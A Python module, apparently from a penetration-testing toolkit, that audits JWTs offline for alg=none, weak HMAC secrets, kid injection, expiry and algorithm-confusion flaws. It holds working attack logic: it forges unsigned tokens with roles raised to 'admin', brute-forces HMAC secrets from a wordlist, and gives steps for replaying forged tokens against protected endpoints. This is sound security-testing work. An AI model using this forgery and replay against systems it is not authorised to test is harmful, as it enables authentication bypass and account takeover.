"""JWT analysis - decode and audit tokens for common flaws.

Deterministic checks (no target contact - pure token analysis):
  - alg=none: server-side accepts unsigned tokens (Critical)
  - weak HMAC secret: HS256 signed with a guessable secret from a small wordlist
  - kid path traversal / injection surface
  - expiry: expired, non-expiring, or wildly-long-lived tokens
  - algorithm confusion surface (RS/HS mismatch potential when alg=HS256 + public
    key material could be swapped in)

A finding here is a token-level flaw. To confirm the SERVER accepts a forged
token, the caller should replay it via http_probe and observe access - this
module returns the forged token + guidance for that step.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from dataclasses import dataclass, field
from typing import Any


# Small, high-signal wordlist for HS256 secret brute. Real weak-secret dumps
# are much larger, but a bounded default keeps this synchronous and safe.
_HS_WORDLIST = [
    "secret", "password", "changeme", "admin", "test", "1234", "12345", "123456",
    "jwt", "jwtsecret", "your-256-bit-secret", "your_jwt_secret", "supersecret",
    "myjwtsecret", "s3cr3t", "P@ssw0rd", "default", "example", "key", "token",
    "development", "dev", "prod", "production", "staging",
]


def _b64url_decode(s: str) -> bytes:
    s = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode("ascii"))


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


@dataclass
class JwtAudit:
    valid_shape: bool
    header: dict[str, Any] = field(default_factory=dict)
    payload: dict[str, Any] = field(default_factory=dict)
    signature_b64: str = ""
    findings: list[dict[str, Any]] = field(default_factory=list)
    forged_none_token: str = ""
    cracked_secret: str | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "valid_shape": self.valid_shape,
            "header": self.header,
            "payload": self.payload,
            "signature_present": bool(self.signature_b64),
            "findings": self.findings,
            "forged_none_token": self.forged_none_token,
            "cracked_secret": self.cracked_secret,
            "next_steps": self._next_steps(),
        }

    def _next_steps(self) -> list[str]:
        steps: list[str] = []
        crit = [f for f in self.findings if f["severity"] == "critical"]
        if self.forged_none_token:
            steps.append(
                "Replay the alg=none forged token via http_probe with "
                "header_json={\"Authorization\":\"Bearer <forged_none_token>\"} against a "
                "protected endpoint. If it grants access, the server accepts unsigned "
                "tokens - Critical auth bypass. Report with both tokens as evidence."
            )
        if self.cracked_secret:
            steps.append(
                f"HMAC secret cracked: {self.cracked_secret!r}. Re-sign the payload with "
                "arbitrary claims (elevate `role`/`sub`) and replay via http_probe. "
                "Server-side acceptance = full auth bypass."
            )
        if not crit and not self.findings:
            steps.append("No token-level flaws detected. Move on.")
        return steps


def _hs_verify(header_b64: str, payload_b64: str, sig_b64: str, secret: str, alg: str) -> bool:
    algos = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    fn = algos.get(alg)
    if not fn:
        return False
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    mac = hmac.new(secret.encode("utf-8"), signing_input, fn).digest()
    try:
        expected = _b64url_decode(sig_b64)
    except Exception:
        return False
    return hmac.compare_digest(mac, expected)


def analyze(token: str, wordlist: list[str] | None = None) -> JwtAudit:
    parts = token.strip().split(".")
    if len(parts) != 3:
        return JwtAudit(valid_shape=False, findings=[{
            "type": "malformed", "severity": "info",
            "detail": f"expected 3 dot-separated parts, got {len(parts)}",
        }])
    header_b64, payload_b64, sig_b64 = parts
    audit = JwtAudit(valid_shape=True, signature_b64=sig_b64)

    try:
        audit.header = json.loads(_b64url_decode(header_b64))
    except Exception as e:
        audit.findings.append({"type": "malformed_header", "severity": "info", "detail": str(e)})
        return audit
    try:
        audit.payload = json.loads(_b64url_decode(payload_b64))
    except Exception as e:
        audit.findings.append({"type": "malformed_payload", "severity": "info", "detail": str(e)})
        return audit

    alg = str(audit.header.get("alg", "")).lower()

    # alg=none surface + build a forged token the caller can replay
    if alg in ("none", ""):
        audit.findings.append({
            "type": "alg_none_declared", "severity": "critical",
            "detail": "Header declares alg=none. If the server honors it, any unsigned "
                     "token is accepted -> auth bypass.",
        })
    forged_header = dict(audit.header); forged_header["alg"] = "none"
    forged_payload = dict(audit.payload)
    for role_field in ("role", "roles", "isAdmin", "is_admin", "admin"):
        if role_field in forged_payload:
            forged_payload[role_field] = "admin" if role_field != "roles" else ["admin"]
    fh = _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
    fp = _b64url_encode(json.dumps(forged_payload, separators=(",", ":")).encode())
    audit.forged_none_token = f"{fh}.{fp}."
    audit.findings.append({
        "type": "alg_none_forgery_surface", "severity": "high",
        "detail": "A forged unsigned token is provided (forged_none_token). Confirm by "
                 "replaying against a protected endpoint - success == Critical.",
    })

    # kid header - path traversal / injection surface
    if "kid" in audit.header:
        kid = str(audit.header["kid"])
        if any(c in kid for c in ("..", "/", "\\", "'", '"', ";")):
            audit.findings.append({
                "type": "kid_injection_surface", "severity": "high",
                "detail": f"kid contains suspicious chars: {kid!r}. If used unfiltered "
                         "as a file path or SQL identifier, may allow key swap / injection.",
            })

    # expiry checks
    now = int(time.time())
    exp = audit.payload.get("exp")
    if exp is None:
        audit.findings.append({
            "type": "no_expiry", "severity": "medium",
            "detail": "Token has no `exp` claim - never expires.",
        })
    elif isinstance(exp, (int, float)):
        if exp < now:
            audit.findings.append({
                "type": "expired", "severity": "info",
                "detail": f"Token expired {now - int(exp)}s ago.",
            })
        elif exp - now > 60 * 60 * 24 * 365:
            audit.findings.append({
                "type": "long_expiry", "severity": "low",
                "detail": f"Token valid for {(exp - now)//86400} days - excessive lifetime.",
            })

    # weak HMAC secret brute (HS256/384/512)
    if alg in ("hs256", "hs384", "hs512"):
        words = wordlist or _HS_WORDLIST
        alg_upper = alg.upper()
        for w in words:
            if _hs_verify(header_b64, payload_b64, sig_b64, w, alg_upper):
                audit.cracked_secret = w
                audit.findings.append({
                    "type": "weak_hmac_secret", "severity": "critical",
                    "detail": f"HMAC secret is {w!r} (matched from a small wordlist). "
                             "Attacker can sign arbitrary tokens.",
                })
                break

    # algorithm confusion surface (HS + jwk/x5c in header is a red flag, but the
    # real confusion vuln needs the public key material; we can only surface it)
    if alg.startswith("hs") and ("jwk" in audit.header or "x5c" in audit.header or "jku" in audit.header):
        audit.findings.append({
            "type": "alg_confusion_surface", "severity": "medium",
            "detail": "HMAC alg with jwk/x5c/jku header - if the server ever fetches a "
                     "public key based on these, an RS->HS confusion attack may apply.",
        })

    return audit
